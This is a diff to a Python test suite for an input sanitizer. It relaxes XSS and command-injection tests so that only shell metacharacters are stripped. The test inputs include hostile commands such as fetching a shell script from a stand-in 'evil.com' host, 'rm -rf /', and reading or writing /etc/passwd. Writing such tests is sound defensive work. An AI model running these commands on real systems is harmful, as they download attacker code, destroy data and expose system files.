@@ -26,10 +26,17 @@ class TestSanitizeStringXSS:
         result = sanitize_string('<iframe src="evil.com">')
         assert '<iframe' not in result.lower()
 
-    def test_encodes_html_entities(self):
+    def test_safe_html_passes_through(self):
+        # Benign tags like <b> are not XSS attacks — safe input must not be corrupted
         result = sanitize_string("Hello <b>World</b>")
-        assert '<b>' not in result
         assert 'Hello' in result
+        assert 'World' in result
+
+    def test_html_encode_opt_in(self):
+        from arcis.sanitizers.sanitize import Sanitizer
+        s = Sanitizer(html_encode=True)
+        result = s.sanitize_string("Hello <b>World</b>")
+        assert '<b>' not in result
         assert 'World' in result
 
     def test_removes_data_protocol(self):
@@ -128,9 +135,11 @@ class TestSanitizeStringCommandInjection:
         result = sanitize_string("input | cat /etc/passwd")
         assert '|' not in result
 
-    def test_removes_common_commands(self):
-        result = sanitize_string("wget http://evil.com/shell.sh")
-        assert 'wget' not in result.lower()
+    def test_shell_metachar_in_command_string(self):
+        # Command words like 'wget' are not stripped — they're common English words.
+        # The dangerous part is shell metacharacters (;, &, |, backtick, $().
+        result = sanitize_string("wget http://evil.com/shell.sh; rm -rf /")
+        assert ';' not in result
 
     def test_removes_backticks(self):
         result = sanitize_string("`whoami`")
@@ -140,10 +149,10 @@ class TestSanitizeStringCommandInjection:
         result = sanitize_string("echo malicious > /etc/passwd")
         assert '>' not in result
 
-    def test_removes_node_and_powershell(self):
+    def test_removes_command_chaining_operators(self):
+        # The && and | operators are stripped; the words themselves are not
         result = sanitize_string("node -e 'malicious' && powershell evil")
-        assert 'node' not in result.lower()
-        assert 'powershell' not in result.lower()
+        assert '&&' not in result
 
     def test_removes_url_encoded_newline(self):
         result = sanitize_string("file.txt%0aid")
